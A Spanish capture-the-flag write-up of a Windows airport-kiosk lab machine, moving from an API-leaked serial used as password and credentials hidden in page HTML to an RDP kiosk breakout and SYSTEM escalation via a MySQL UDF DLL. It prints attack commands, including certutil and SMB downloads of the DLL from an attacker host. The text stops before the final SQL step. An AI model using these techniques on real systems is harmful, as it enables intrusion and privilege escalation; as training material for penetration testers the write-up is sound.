Un kiosko de autofacturación de aeropuerto cuyo portal de gestión **Nexion DeviceHub** (TCP 8443) filtra su propio número de serie a través de una API sin autenticar, y ese serial *es* la contraseña del portal. El dashboard autenticado entrega credenciales locales de Windows en el contenido del lado cliente, que dan una sesión RDP encerrada dentro de una aplicación kiosko a pantalla completa. Escapar del kiosko a través de un diálogo de error del dispositivo da una `cmd.exe` como `KioskUser` y la flag de usuario. La escalada de privilegios abusa de un **servicio MySQL 8.0 corriendo como `LocalSystem`** combinado con una ACL débil sobre su directorio de instalación: dejar una DLL de `lib_mysqludf_sys` en la carpeta de plugins y registrar una UDF ejecuta comandos como `SYSTEM`.

## Reconocimiento y Enumeración

El objetivo de esta fase fue mapear los servicios expuestos, identificar el punto de entrada y entender qué tipo de dispositivo tenía delante.

### Descubrimiento del Host

Comprobación de alcance y pista sobre el sistema operativo mediante ICMP:

```bash
ping -c 1 10.129.72.239
PING 10.129.72.239 (10.129.72.239) 56(84) bytes of data.
64 bytes from 10.129.72.239: icmp_seq=1 ttl=127 time=43.5 ms
```

Un TTL de **127** apunta a un host Windows (por defecto 128, decrementado una vez al atravesar el salto de enrutamiento).

### Escaneo de Puertos

Un escaneo TCP completo con scripts por defecto y detección de versiones:

```bash
sudo nmap -p- -sCV 10.129.72.239 -oN nmap
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
3389/tcp open  ms-wbt-server Microsoft Terminal Service
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8443/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-title: Nexion DeviceHub - Login
|_Requested resource was /login
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-cors: GET POST PUT OPTIONS
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Cuatro puertos, y leerlos en conjunto ya dibuja todo el engagement. **135 (MSRPC)** y **3389 (RDP)** son las superficies remotas habituales de Windows. **5985** es **WinRM** — PowerShell remota, interesante solo cuando existan credenciales válidas. **8443** es el verdadero punto de partida: una aplicación web titulada *Nexion DeviceHub - Login*. Todo en este reparto dice *consigue credenciales desde la aplicación web, y luego úsalas contra alguno de los servicios de acceso remoto*.

Dos detalles de 8443 merecen anotarse, pero son pistas falsas. La línea `http-trane-info` (*Problem with XML parsing of /evox/about*) es el script NSE fallando al identificar un dispositivo de automatización de edificios Trane — un falso positivo, no un endpoint Trane real. Y el permisivo `http-cors: GET POST PUT OPTIONS` tienta hacia un enfoque de subida de archivos sobre la API del scanner, que tampoco lleva a ningún sitio.

El server header `Microsoft-HTTPAPI/2.0` tanto en 5985 como en 8443 también es informativo: se trata de una aplicación autohospedada sobre el stack `http.sys` de Windows, no IIS. No hay pipeline clásico de ASP.NET, así que los ficheros `.aspx` subidos nunca se interpretarían — conviene interiorizarlo antes de perder tiempo con una webshell.

### Enumeración Web — Nexion DeviceHub (8443)

La propia máquina proporcionaba una pista heredada de una caja hermana:

> In the Layover machine, you uncovered a name and a booking confirmation code. Maybe they'll come in handy here? Jenny Crawford / KS7X2M

![Pista de la máquina Layover: Jenny Crawford / KS7X2M](/assets/img/HTB/Touch/cap1.png)

Esto es un **callejón sin salida para el foothold**. El par nombre/código de reserva corresponde a una funcionalidad de "booking lookup" dentro del kiosko más adelante, no al login del portal, así que lo anoté y seguí en lugar de forzarlo en el campo de contraseña.

Fuzzing de contenido y de API contra el portal:

```bash
wfuzz -c -w /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
      -u http://10.129.72.239:8443/FUZZ --hc 302
000000039:   200   2 L   124 W   3570 Ch   "login"
000001012:   403   0 L     2 W     35 Ch   "api"

wfuzz -c -w /usr/share/SecLists/Discovery/Web-Content/api/api-endpoints.txt \
      -u http://10.129.72.239:8443/FUZZ --hc 302
000000093:   200   0 L     3 W    116 Ch   "api/status"
```

`/api` en sí devolvió `403`, pero el fuzz de endpoints encontró `/api/status` devolviendo `200` sin autenticación alguna. Al leerlo:

```bash
curl http://10.129.72.239:8443/api/status
{"device":"Nexion DeviceHub DH-100","serial":"NX-DH-2024-B7042","firmware":"1.4.2","status":"online","uptime":65763}
```

La lección aquí es **leer con atención las respuestas de API sin autenticar**: esta revela un número de serie, `NX-DH-2024-B7042`. Los dispositivos embebidos y de gestión de proveedores derivan con muchísima frecuencia su contraseña por defecto de un identificador — número de serie, MAC, etiqueta de activo — así que un serial filtrado es un candidato a credencial, no solo metadatos.

## Explotación

### Autenticación con el serial como contraseña

El formulario de login tiene un único campo **Device password** (sin usuario). Introducir el serial de la API de estado funcionó al primer intento:

```text
Device password: NX-DH-2024-B7042
```

![Dashboard de DeviceHub tras autenticar con el serial del dispositivo](/assets/img/HTB/Touch/cap2.png)

El dashboard no es el objetivo en sí — es un pivote hacia algo más útil. Las tarjetas de dispositivo del scanner y de la impresora muestran campos de credenciales enmascarados con un control **show** junto a cada uno.

### Divulgación de credenciales en el lado cliente

Una suposición habitual es que pulsar **show** dispara una petición autenticada para obtener el secreto. En aplicaciones mal construidas el secreto *ya* ha sido entregado al navegador y simplemente está oculto con HTML/CSS/JavaScript. Es exactamente el caso aquí — el handler de revelado está cableado con el valor en texto plano incrustado en la página:

```html
<tr><td class="label">Username</td><td class="mono">
  <span id="dpu1">••••••••</span>
  <span onclick="toggleCred('dpu1','KioskUser')">show</span></td></tr>
<tr><td class="label">Password</td><td class="mono">
  <span id="dpp1">••••••••</span>
  <span onclick="toggleCred('dpp1','K!0sk2026#')">show</span></td></tr>
```

![Tarjeta de la impresora revelando las credenciales de KioskUser en el lado cliente](/assets/img/HTB/Touch/cap3.png)

Las credenciales `KioskUser:K!0sk2026#` están presentes en el propio contenido del lado cliente, sin necesidad de ir al servidor. Lo crítico: el usuario `KioskUser` y el formato de la contraseña tienen pinta de **cuenta local de Windows**, no de un login solo de aplicación — lo que pone en juego los servicios de acceso remoto del escaneo de puertos.

### Elegir el servicio de acceso remoto correcto

Con una credencial de Windows en mano, el reflejo es probarla contra WinRM, RDP y cualquier cosa que autentique. WinRM (5985) la rechazó — `KioskUser` sencillamente no es miembro del grupo *Remote Management Users*, así que WinRM no es la vía prevista independientemente de si la contraseña es válida. RDP (3389) es la entrada. Hay que tener en cuenta que la caja tiene NLA desactivado, así que forzar la seguridad RDP estándar evita un fallo de negociación TLS:

```bash
xfreerdp /u:KioskUser /p:'K!0sk2026#' /v:10.129.72.239 /sec:rdp /cert:ignore +clipboard /dynamic-resolution
```

La sesión conectó, pero no a un escritorio normal — la máquina arranca directamente en una aplicación kiosko a pantalla completa, **HTB Airways Self Check-in**, con la shell de Windows oculta.

![Sesión RDP aterrizando dentro del kiosko de autofacturación a pantalla completa](/assets/img/HTB/Touch/cap4.png)

### Fuga del kiosko (kiosk breakout)

Un kiosko es una aplicación a pantalla completa que tapa el escritorio; la fuga casi siempre es un diálogo, un hiperenlace o un selector de archivos que alcanza algo capaz de ejecutar código. Esta caja telegrafía la cadena. El kiosko expone un flujo **Staff Login → Scan Badge** que depende de que el scanner de pasaportes esté online:

![Pantalla de autenticación de personal pidiendo escanear una tarjeta](/assets/img/HTB/Touch/cap5.png)

El scanner se puede deshabilitar remotamente desde el portal DeviceHub en 8443 (el control **Power Off** de la página Scanner), lo que lo deja `OFFLINE`:

![Página del scanner mostrando el dispositivo apagado / offline](/assets/img/HTB/Touch/cap6.png)

Con el scanner caído, disparar **Scan Badge** dentro del kiosko levanta un diálogo de error de dispositivo — y ese diálogo contiene un **hiperenlace de soporte** pulsable:

![Diálogo de error del dispositivo con un enlace de soporte pulsable](/assets/img/HTB/Touch/cap7.png)

Pulsar el enlace abre **Microsoft Edge**, que es una aplicación completa corriendo *fuera* de la shell del kiosko. La página no carga (la caja no tiene internet), pero Edge ya está abierto — el kiosko está roto:

![Microsoft Edge abierto desde el enlace de soporte, escapando del kiosko](/assets/img/HTB/Touch/cap8.png)

Desde un navegador, la fuga clásica hacia una shell es un diálogo de archivo nativo. Pulsar `Ctrl+O` en Edge abre un diálogo **Abrir** de Windows; navegando a `C:\Windows\System32`, haciendo clic derecho en `cmd.exe` y eligiendo **Abrir** se lanza un intérprete de comandos. *Ejecutar como administrador* pediría una contraseña — `K!0sk2026#` no funciona ahí — así que lo que tomamos es un prompt normal:

![Diálogo de abrir archivo en System32, clic derecho sobre cmd.exe](/assets/img/HTB/Touch/cap9.png)

```text
C:\Windows\System32>whoami
kiosk-042\kioskuser
```

![cmd.exe ejecutándose como kiosk-042\kioskuser](/assets/img/HTB/Touch/cap10.png)

## Escalada de Privilegios — `KioskUser` → `SYSTEM`

Este es el núcleo de la caja y la parte que merece la pena interiorizar, porque depende por completo de cómo decide Windows *quién puede hacer qué*. Lo construyo concepto a concepto.

### Leyendo el token: `whoami /all`

```text
PS C:\Users\KioskUser\Desktop> whoami /all

USER INFORMATION
----------------
User Name           SID
=================== ==============================================
kiosk-042\kioskuser S-1-5-21-2554513647-1216688035-3073314765-1002

GROUP INFORMATION
----------------------------------------------------------------
KIOSK-042\Printer Administrators       Alias  S-1-5-21-2554513647-1216688035-3073314765-1003
BUILTIN\Remote Desktop Users           Alias  S-1-5-32-555
BUILTIN\Users                          Alias  S-1-5-32-545
[...]
Mandatory Label\Medium Mandatory Level Label  S-1-16-8192

PRIVILEGES INFORMATION
----------------------
Privilege Name                State
============================= ========
SeChangeNotifyPrivilege       Enabled
SeUndockPrivilege             Disabled
SeIncreaseWorkingSetPrivilege Disabled
SeTimeZonePrivilege           Disabled
```

Dos cosas que extraer de aquí, y entender ambas es el objetivo.

**Primero, los privilegios son un callejón sin salida.** `SeChangeNotifyPrivilege` lo tiene todo el mundo por defecto (es "bypass traverse checking", para recorrer rutas de directorios). Los otros tres — undock, increase working set, change time zone — son cosméticos. Lo que importa es lo que *falta*: no hay `SeImpersonatePrivilege` (así que nada de abuso de token estilo Potato), ni `SeBackupPrivilege` / `SeRestorePrivilege` (nada de lectura/escritura de ficheros saltándose ACLs), ni `SeDebugPrivilege`, ni `SeLoadDriverPrivilege`. Combinado con un nivel de integridad **Medium**, las vías de escalada basadas en privilegios están cerradas. Descartarlas con seguridad es tan valioso como encontrar el camino real.

**Segundo, los grupos tienen la pista.** Cada SID aquí es `S-1-5-<algo>`; la estructura codifica de dónde viene la identidad.

> **Tangente — SIDs y RIDs.** Un SID como `S-1-5-21-2554513647-1216688035-3073314765-1002` se descompone en un identificador de máquina (o de dominio) — `S-1-5-21-2554513647-1216688035-3073314765` — seguido de un **RID** (Relative Identifier), aquí `1002`. Los grupos integrados y bien conocidos tienen SIDs cortos y fijos, idénticos en cualquier Windows: `BUILTIN\Users` es siempre `S-1-5-32-545`, `Remote Desktop Users` siempre `S-1-5-32-555`. Un RID de **1000 o superior** sobre el SID *de la propia máquina* significa que la cuenta o el grupo se **creó localmente en este host**. `KioskUser` es `-1002`; `Printer Administrators` es `-1003` — creados uno tras otro al aprovisionar la caja. Un grupo local no estándar nombrado por el autor de la máquina es casi siempre el hilo del que tirar, porque existe únicamente para conceder algún permiso que el autor quería que este usuario tuviera.

Así que `KIOSK-042\Printer Administrators` es lo que llama la atención. Importante: el nombre del grupo es solo decoración — "printer administrators" no tiene nada que ver con la escalada real. Lo que importa es la **ACL que ese grupo (o la cuenta) arrastra**, que es lo que el resto de esta sección rastrea.

### Encontrar un proceso `SYSTEM` del que abusar

El patrón de escalada en Windows es: *conseguir que tu código se ejecute dentro de un proceso que ya es `SYSTEM`*. No "te conviertes" en `SYSTEM`; haces que algo que ya es `SYSTEM` ejecute lo que tú quieres. Así que la siguiente pregunta es qué servicios corren como `SYSTEM`. Enumerando los servicios y su cuenta de arranque:

```text
C:\Users\KioskUser\Desktop>sc query
SERVICE_NAME: MySQL80
DISPLAY_NAME: MySQL 8.0
        STATE  : 4  RUNNING

C:\Users\KioskUser\Desktop>sc qc MySQL80
SERVICE_NAME: MySQL80
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        BINARY_PATH_NAME   : C:\MySQL\bin\mysqld.exe --defaults-file=C:\MySQL\my.ini MySQL80
        SERVICE_START_NAME : LocalSystem
```

`sc qc` lee la configuración de un servicio. Dos campos deciden todo:

- **`SERVICE_START_NAME : LocalSystem`** — es la cuenta bajo la que corre el servicio, el equivalente en Windows del `User=` de un unit de systemd. `LocalSystem` *es* `NT AUTHORITY\SYSTEM`. Así que `mysqld.exe` ya corre como `SYSTEM`, y cualquier cosa que ejecute internamente hereda eso.
- **`BINARY_PATH_NAME : C:\MySQL\...`** — MySQL está instalado en `C:\MySQL`, colgado de la raíz, no bajo `C:\Program Files`. Eso no es cosmético: `C:\Program Files` arrastra ACLs estrictas por defecto (solo admins y `SYSTEM` escriben), mientras que una carpeta hecha a mano en la raíz del disco frecuentemente hereda permisos mucho más laxos. Primera señal de que la primitiva de escritura podría ser real.

### La verdadera primitiva de escritura — una ACL débil

Comprobando quién puede escribir en el árbol de MySQL, incluido su directorio de plugins:

```text
C:\> icacls C:\MySQL
C:\MySQL BUILTIN\Administrators:(I)(OI)(CI)(F)
         NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
         BUILTIN\Users:(I)(OI)(CI)(RX)
         NT AUTHORITY\Authenticated Users:(I)(M)
         NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(IO)(M)

C:\MySQL\lib> icacls plugin
plugin   BUILTIN\Administrators:(I)(OI)(CI)(F)
         NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
         BUILTIN\Users:(I)(OI)(CI)(RX)
         NT AUTHORITY\Authenticated Users:(I)(M)
         NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(IO)(M)
```

Aquí está la corrección que importa para los apuntes: la primitiva de escritura **no** es `Printer Administrators` — ese grupo no aparece por ningún lado en estas ACLs. La concesión es a **`NT AUTHORITY\Authenticated Users`**, es decir, *cualquier usuario autenticado de la caja*, `KioskUser` incluido. El grupo `Printer Administrators` era una pista con pinta plausible, pero la verdadera mala configuración es una ACL laxa aplicada a todo el árbol `C:\MySQL`. Siempre deja que la salida de `icacls` tenga la última palabra sobre la corazonada.

> **Tangente — decodificando los flags de `icacls`.** Las letras entre paréntesis son dos cosas distintas: flags de herencia y el permiso en sí.
> - `(I)` — **Inherited** (Heredado): esta ACE baja de una carpeta padre (`C:\MySQL`), no está puesta directamente aquí. Por eso las entradas idénticas aparecen en `C:\MySQL`, `\lib` y `\lib\plugin` — caen en cascada desde la raíz.
> - `(OI)` — **Object Inherit**: los *ficheros* creados dentro heredan esta ACE.
> - `(CI)` — **Container Inherit**: las *subcarpetas* heredan esta ACE.
> - `(IO)` — **Inherit Only**: esta ACE concreta no aplica a la carpeta en sí, solo a sus hijos.
> - `(M)` — **Modify**: leer + **escribir** + ejecutar + borrar.
>
> Juntando las dos líneas de `Authenticated Users`: la primera `(I)(M)` concede Modify sobre la carpeta plugin misma; la segunda `(I)(OI)(CI)(IO)(M)` propaga Modify a todo lo que se cree dentro. Resultado neto: `KioskUser` puede **dejar un fichero en `C:\MySQL\lib\plugin\`**. Compáralo con `BUILTIN\Users:(RX)` (solo lectura y ejecución, sin escritura) para ver lo inusual que es la concesión `(M)` — esta única ACE es toda la vulnerabilidad.

### Obtención de las credenciales de MySQL

El acceso de escritura a la carpeta de plugins es necesario pero no suficiente — la UDF la carga *MySQL*, así que aún necesito conectarme a la base de datos, lo que significa credenciales. Existía un fichero de configuración pero era ilegible:

```powershell
PS C:\ProgramData\HTB Airways> type db-config.ini
type : Access to the path 'C:\ProgramData\HTB Airways\db-config.ini' is denied.
```

Acceso denegado al `.ini`, pero un script batch vecino en la misma carpeta era legible y llevaba la contraseña en texto plano:

```text
C:\ProgramData\HTB Airways>type refresh-dates.bat
@echo off
C:\MySQL\bin\mysql.exe -u root -pHTB@irw4ys_DB!2026 < "C:\ProgramData\HTB Airways\refresh-dates.sql" 2>nul
```

Eso da `root:HTB@irw4ys_DB!2026`. Las cuatro piezas están ya presentes: MySQL corre como `SYSTEM`, el directorio de plugins es escribible, hay una shell en la caja, y las credenciales de la base de datos están en mano.

### Por qué funciona la vía UDF (y por qué no necesita reiniciar el servicio)

MySQL se puede extender con **User Defined Functions** — funciones nativas escritas en C/C++, compiladas en una librería compartida (`.dll` en Windows, exactamente el análogo Windows de un `.so` de Linux). Cuando se llama a una función de la librería desde SQL, MySQL ejecuta ese código nativo **dentro de su propio proceso, con sus propios privilegios**. Esa última cláusula es todo el ataque: el código dentro de una librería cargada por `mysqld.exe` corre como `SYSTEM`.

La UDF armada es `lib_mysqludf_sys`, que exporta `sys_exec()` / `sys_eval()` — funciones que ejecutan un comando del sistema. MySQL solo carga librerías UDF desde su **`plugin_dir`** configurado, que es precisamente la carpeta que la ACL débil nos deja escribir.

Una sutileza clave que conviene capturar en los apuntes: esto necesita **dos permisos independientes que la gente confunde rutinariamente**:

1. **Escribir un fichero en `plugin_dir`** — una ACL sobre el *sistema de ficheros* (confirmada arriba).
2. **Controlar el servicio MySQL** (parar/arrancar/reiniciar) — una ACL sobre el *objeto-servicio*, un security descriptor completamente separado.

Un usuario de kiosko de bajo privilegio tiene (1) pero casi nunca (2) — y la elegancia de la técnica UDF es que **solo necesita (1)**. La librería se carga *bajo demanda* en el instante en que ejecutas `CREATE FUNCTION ... SONAME`, en caliente, sin reinicio. La intuición de "copiar la DLL y reiniciar el servicio" lo mezcla con otras privescs basadas en servicios (reemplazo del binario, unquoted service path) que *sí* requieren un reinicio; la UDF no, que es exactamente por lo que funciona para una cuenta que no puede tocar el servicio.

### Dejando la UDF y ejecutando como `SYSTEM`

Kali trae una build precompilada de 64 bits de la librería (64 bits importa — una arquitectura que no coincide hace que `CREATE FUNCTION` falle con `errno 193`). Copiándola del directorio de datos de Metasploit:

```bash
cp /snap/metasploit-framework/2435/opt/metasploit-framework/embedded/framework/data/exploits/mysql/lib_mysqludf_sys_64.dll .
```

La transferí de dos formas para practicar. Por SMB con impacket:

```bash
impacket-smbserver share . -smb2support -user 'ander' -password 'ander123'
```

```text
C:\MySQL\lib\plugin>copy \\<ATTACKER_IP>\share\lib_mysqludf_sys_64.dll .
        1 file(s) copied.
```

Y living-off-the-land con `certutil` contra un servidor web de Python:

```text
C:\MySQL\lib\plugin>certutil -urlcache -split -f "http://<ATTACKER_IP>:8000/lib_mysqludf_sys_64.dll" lib_mysqludf_sys_64.dll
****  Online  ****
CertUtil: -URLCache command completed successfully.
```

Con la DLL en `plugin_dir`, registrar la función la carga en el proceso `SYSTEM` y un primer comando confirma el contexto de ejecución. Fíjate en las barras invertidas dobles — dentro de un string SQL `\` es un carácter de escape:

## Lecciones Clave

- **Las respuestas de API sin autenticar son fuentes de credenciales, no solo metadatos.** El endpoint `/api/status` filtró un número de serie que también era la contraseña del portal. En dispositivos embebidos y de gestión de proveedores, cualquier identificador divulgado (serial, MAC, etiqueta de activo) debe probarse como credencial por defecto/derivada antes que nada.
- **Los controles de "mostrar contraseña" son con frecuencia teatro del lado cliente.** Cuando un secreto está enmascarado en el navegador, inspecciona el código fuente y el handler de revelado antes de asumir una ida al servidor. Si el texto plano ya está en el DOM o en el JavaScript, el enmascarado es cosmético y la credencial es tuya.
- **Empareja la credencial con el servicio correcto, y no leas un rechazo como "contraseña incorrecta".** WinRM rechazó una credencial válida simplemente porque la cuenta carecía de pertenencia a *Remote Management Users*. Un chequeo fallido de WinRM/RDP vía una herramienta (p. ej. errores de negociación NLA/TLS) es sobre la configuración del servicio, no necesariamente sobre la contraseña — confirma con un cliente real antes de descartar las credenciales.
- **Las fugas de kiosko viven en diálogos de error, hiperenlaces y selectores de archivos.** La fuga fiable es cualquier elemento de UI que alcance un navegador, y desde un navegador cualquier diálogo de archivo nativo (`Ctrl+O`) que pueda lanzar `cmd.exe`. Deshabilitar una dependencia (el scanner) para forzar un diálogo de error es un patrón repetible para escapes de bloqueo de aplicaciones.
- **En Windows, el `SERVICE_START_NAME` de un servicio es toda la pregunta de la escalada.** Que `sc qc <servicio>` revele `LocalSystem` significa que cualquier código que logres que ese servicio ejecute corre como `SYSTEM`. Enumerar servicios por su cuenta de arranque debería ser reflejo en cualquier foothold de Windows.
- **`icacls` tiene la última palabra sobre la corazonada.** Un grupo local custom con nombre sugerente (`Printer Administrators`) parecía el vector de privesc, pero la verdadera primitiva de escritura era una ACE demasiado amplia de `Authenticated Users:(M)` sobre `C:\MySQL`. Confirma siempre la ACL concreta sobre el objeto objetivo en lugar de inferir por los nombres de grupo. El software instalado fuera de la raíz del disco (`C:\MySQL`) rutinariamente se salta las ACLs estrictas que `C:\Program Files` impone.
- **MySQL corriendo como `SYSTEM` más un `plugin_dir` escribible es territorio de `lib_mysqludf_sys`.** La UDF se carga con `CREATE FUNCTION` — en caliente, en el proceso, sin reinicio del servicio — así que solo requiere escritura en el sistema de ficheros sobre la carpeta de plugins y credenciales válidas de BD, nunca control sobre el objeto-servicio. No lo confundas con privescs de reemplazo de binario de servicio que sí necesitan reinicio.
- **Vigila la arquitectura de los payloads nativos.** Un desajuste de 32/64 bits entre la DLL de la UDF y `mysqld.exe` falla con `errno 193`. Confirma la build del servidor (`SHOW VARIABLES LIKE '%version_compile_machine%'`) antes de elegir la librería.
